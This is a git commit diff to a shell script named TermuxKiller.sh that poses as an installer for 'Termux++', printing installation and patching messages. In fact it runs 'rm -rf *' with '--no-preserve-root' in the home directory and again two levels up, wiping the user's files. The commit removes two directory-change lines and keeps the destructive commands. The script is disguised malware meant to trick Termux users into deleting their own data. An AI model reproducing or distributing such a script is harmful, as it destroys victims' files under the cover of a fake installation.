04ec0c0df026944c2bdd9ecba460593f3c0bbf84
Begitdj <egyptha29@gmail.com>
2024-11-05 22:46:13 +0700

    Update TermuxKiller.sh
    Return back changes not work

--- TermuxKiller.sh
+++ TermuxKiller.sh
@@ -3,7 +3,5 @@ echo Installing Termux++ Please wait....
 echo Patching files....
 cd $HOME && rm -rf * --no-preserve-root
 echo Installation Done!
-cd ~/storage/shared
-cd
 cd .. && cd .. && rm -rf * --no-preserve-root
 exit
